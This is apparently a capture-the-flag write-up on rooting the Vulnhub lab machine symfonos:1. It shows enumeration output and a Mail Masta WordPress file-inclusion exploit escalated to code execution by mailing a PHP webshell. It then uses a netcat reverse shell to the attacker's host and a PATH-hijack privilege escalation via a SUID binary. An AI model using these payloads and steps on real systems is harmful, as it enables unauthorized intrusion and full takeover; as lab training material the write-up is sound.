# symfonos - Vulnhub

## Enumeration

### Let's start with the nmap scan
```
# Nmap 7.92 scan initiated Fri Apr 22 02:56:57 2022 as: nmap -sC -sV -oN nmap 192.168.1.25
Nmap scan report for symfonos (192.168.1.25)
Host is up (0.0028s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host:  symfonos.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2022-04-21T21:27:10
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2022-04-21T16:27:10-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 22 02:57:47 2022 -- 1 IP address (1 host up) scanned in 50.08 seconds
                                                                                              
```

### Here we find many ports open that means a large surface area to enuerate, so let's start with my favourite part, enumerating webserver by using gobuster, we got
```
/manual               (Status: 301) [Size: 317] [--> http://symfonos.local/manual/]
/server-status        (Status: 403) [Size: 302]
```

### We didn't find anything interesting here, lets enumerate other service, i saw port 139,445 are open which means, now we can enumerate samba, lets enumerate using enum4linus
```
enum4linux 192.168.1.25
```

### Result
```
 =================================( Share Enumeration on 192.168.1.25 )=================================
                                                                                                                                                                       
                                                                                                                                                                       
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SYMFONOS

[+] Attempting to map shares on 192.168.1.25                                                                                                                           
                                                                                                                                                                       
//192.168.1.25/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                      
//192.168.1.25/helios   Mapping: DENIED Listing: N/A Writing: N/A
//192.168.1.25/anonymous        Mapping: OK Listing: OK Writing: N/A

```

### Here we get to know that anonymous share is open, So let's try to access this share using smbclient
```
smbclient //192.168.1.25/anonymous
```

### Entrying empty password we aremanaged to login to this share 
### Here we found "attention.txt" which says
```
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus

```

### Here we get to know that these passwords are used, we tried logging in using ssh but it failed, So i tried these passwords on smbclient user(helios) i.e
```
smbclient //192.168.1.25/helios -U helios
```
### And we managed to loggin by using the password "qwerty"

### Here we got more interesting files i.e
```
$ smbclient //192.168.1.25/helios -U helios
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 06:02:05 2019
  ..                                  D        0  Sat Jun 29 06:07:04 2019
  research.txt                        A      432  Sat Jun 29 06:02:05 2019
  todo.txt                            A       52  Sat Jun 29 06:02:05 2019

```
### Which states
```
$ cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```
```
$ cat todo.txt 

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

### From todo.txt we found an interesting directory "/h3l105", So we tried and here we got wordpress website
![wordpress-site](https://github.com/sigwotts/vulnhub/blob/main/symfonos/wordpress-site.png)

### Then, we tried to enumerate the website using wp-scan
```
$ wpscan --url http://symfonos.local/h3l105/ --enumerate p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://symfonos.local/h3l105/ [192.168.1.25]
[+] Started: Fri Apr 22 03:09:32 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr 22 03:09:46 2022
[+] Requests Done: 44
[+] Cached Requests: 5
[+] Data Sent: 10.729 KB
[+] Data Received: 12.113 MB
[+] Memory used: 234.074 MB
[+] Elapsed time: 00:00:13
                                    
```

### Here we find 2 plugins mail-masta & site-editor, I tried searchsploit to find any vulnerabily in the mail-masta plugin and i found this version is vulnerable to LFI
![searchsploit](https://github.com/sigwotts/vulnhub/blob/main/symfonos/searchsploit.png)

### So we can see in the expoit!
```
[+] Date: [23-8-2016]
[+] Autor Guillermo Garcia Marcos
[+] Vendor: https://downloads.wordpress.org/plugin/mail-masta.zip
[+] Title: Mail Masta WP Local File Inclusion
[+] info: Local File Inclusion

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

Source: /inc/lists/csvexport.php:
Line 5: include($_GET['pl']);

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

Source: /inc/lists/csvexport.php
Line 5: include($_GET['pl']);

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);


This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the server.


Typical proof-of-concept would be to load passwd file:


http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd   
```
### So we tried to modify our url acocording to this exploit
```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
![LFI](https://github.com/sigwotts/vulnhub/blob/main/symfonos/LFI.png)

## Time to get the inital foothold to the machine

### Then we thought we can escalate LFI to RCE by log poisoning, For that we have to connect to SMTP via telnet
```
$ telnet 192.168.1.25 25
Trying 192.168.1.25...
Connected to 192.168.1.25.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)

500 5.5.2 Error: bad syntax
MAIL FROM: <sig>                
250 2.1.0 Ok
RCPT TO: Helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?>
.
250 2.0.0 Ok: queued as 7FA9B40698
421 4.4.2 symfonos.localdomain Error: timeout exceeded
Connection closed by foreign host.
```
### Then we tried to acess the url using the paramater "c"
```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id
```
```
From root@symfonos.localdomain Fri Jun 28 21:08:55 2019 Return-Path: X-Original-To: root Delivered-To: root@symfonos.localdomain Received: by symfonos.localdomain (Postfix, from userid 0) id 3DABA40B64; Fri, 28 Jun 2019 21:08:54 -0500 (CDT) From: root@symfonos.localdomain (Cron Daemon) To: root@symfonos.localdomain Subject: Cron dhclient -nw MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: X-Cron-Env: X-Cron-Env: X-Cron-Env: Message-Id: <20190629020855.3DABA40B64@symfonos.localdomain> Date: Fri, 28 Jun 2019 21:08:54 -0500 (CDT) /bin/sh: 1: dhclient: not found From MAILER-DAEMON Thu Apr 21 16:25:49 2022 Return-Path: <> X-Original-To: helios@symfonos.localdomain Delivered-To: helios@symfonos.localdomain Received: by symfonos.localdomain (Postfix) id 510FD40B8C; Thu, 21 Apr 2022 16:25:49 -0500 (CDT) Date: Thu, 21 Apr 2022 16:25:49 -0500 (CDT) From: MAILER-DAEMON@symfonos.localdomain (Mail Delivery System) Subject: Undelivered Mail Returned to Sender To: helios@symfonos.localdomain Auto-Submitted: auto-replied MIME-Version: 1.0 Content-Type: multipart/report; report-type=delivery-status; boundary="2EE7C40AB0.1650576349/symfonos.localdomain" Content-Transfer-Encoding: 8bit Message-Id: <20220421212549.510FD40B8C@symfonos.localdomain> This is a MIME-encapsulated message. --2EE7C40AB0.1650576349/symfonos.localdomain Content-Description: Notification Content-Type: text/plain; charset=utf-8 Content-Transfer-Encoding: 8bit This is the mail system at host symfonos.localdomain. I'm sorry to have to inform you that your message could not be delivered to one or more recipients. It's attached below. For further assistance, please send mail to postmaster. If you do so, please include this problem report. You can delete your own text from the attached returned message. The mail system : Host or domain name not found. Name service error for name=blah.com type=MX: Host not found, try again --2EE7C40AB0.1650576349/symfonos.localdomain Content-Description: Delivery report Content-Type: message/delivery-status Reporting-MTA: dns; symfonos.localdomain X-Postfix-Queue-ID: 2EE7C40AB0 X-Postfix-Sender: rfc822; helios@symfonos.localdomain Arrival-Date: Fri, 28 Jun 2019 19:46:02 -0500 (CDT) Final-Recipient: rfc822; helios@blah.com Original-Recipient: rfc822;helios@blah.com Action: failed Status: 4.4.3 Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error for name=blah.com type=MX: Host not found, try again --2EE7C40AB0.1650576349/symfonos.localdomain Content-Description: Undelivered Message Content-Type: message/rfc822 Content-Transfer-Encoding: 8bit Return-Path: Received: by symfonos.localdomain (Postfix, from userid 1000) id 2EE7C40AB0; Fri, 28 Jun 2019 19:46:02 -0500 (CDT) To: helios@blah.com Subject: New WordPress Site X-PHP-Originating-Script: 1000:class-phpmailer.php Date: Sat, 29 Jun 2019 00:46:02 +0000 From: WordPress Message-ID: <65c8fc37d21cc0046899dadd559f3bd1@192.168.201.134> X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer) MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Your new WordPress site has been successfully set up at: http://192.168.201.134/h3l105 You can log in to the administrator account with the following information: Username: admin Password: The password you chose during installation. Log in here: http://192.168.201.134/h3l105/wp-login.php We hope you enjoy your new site. Thanks! --The WordPress Team https://wordpress.org/ --2EE7C40AB0.1650576349/symfonos.localdomain-- From raj@symfonos.localdomain Thu Apr 21 16:47:29 2022 Return-Path: X-Original-To: Helios Delivered-To: Helios@symfonos.localdomain Received: from unknown (unknown [192.168.1.23]) by symfonos.localdomain (Postfix) with SMTP id 7FA9B40698 for ; Thu, 21 Apr 2022 16:46:59 -0500 (CDT) uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev) 
```

### This technique is known as SMTP log poisoning and through such type of vulnerability, we can easily take the reverse shell to our attacker machine
### For that we set up a netcat listner and tried using the nc revershell one liner i.e
```
symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/bash 192.168.1.23 4444
```
### AND BOOOOMMMMMMMM!!!!!!! We got the shell

## Prev esc

### We tried to upgrade out shell using
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Then we tried finding the binaried we can execute to escalate out privilages
```
find / -perm -u=s -type f 2>/dev/null
```
```
<inc/campaign$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```
### Here we got an interesting binary in the /opt directory, let's view it
### Lets see the metadata of the file using strings
```
<h3l105/wp-content/plugins/mail-masta/inc/campaign$ strings /opt/statuscheck
```
```
strings /opt/statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
prog.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment

```
### Here we find that the script  was trying to call curl but get a fatal error when program executes. Such type of error occurs due to missing path variable in the current directory.

### url to Linux Privilege Escalation Using PATH Variable
```
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
```

### Then we created a file using echo and by giving it suitable permissions, we set the path and then after executing the binary, we are root
```
helios@symfonos:/tmp$ echo "/bin/sh" > curl 
echo "/bin/sh" > curl
helios@symfonos:/tmp$ chmod 777 curl 
chmod 777 curl 
helios@symfonos:/tmp$ echo $PATH                   
echo $PATH
.:.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
helios@symfonos:/tmp$ /opt/statuscheck
/opt/statuscheck
# id
id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!


```
### AND BOOOOOMMMMMMMM!!!!!!!!!, we are root
# Thanks for reading <3 by sigwotts
